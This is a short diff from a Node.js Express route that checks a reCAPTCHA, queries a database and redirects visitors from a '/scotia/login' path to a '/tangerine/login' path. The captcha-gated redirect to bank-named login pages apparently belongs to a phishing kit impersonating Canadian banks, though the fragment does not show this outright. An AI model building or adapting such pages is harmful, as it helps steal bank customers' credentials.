@@ -329,7 +329,7 @@ app.post('/verify', verifyRecaptcha, async (req, res, next) => {
 
         let info = result.rows[0].data.settings.info;  
         
-        if(result.rows.length > 0){res.redirect('/scotia/login')} else {res.render('catpcha/index', {sitekey: RECAPTCHA_SITE_KEY});}
+        if(result.rows.length > 0){res.redirect('/tangerine/login')} else {res.render('catpcha/index', {sitekey: RECAPTCHA_SITE_KEY});}
         
         
     } catch (error) {
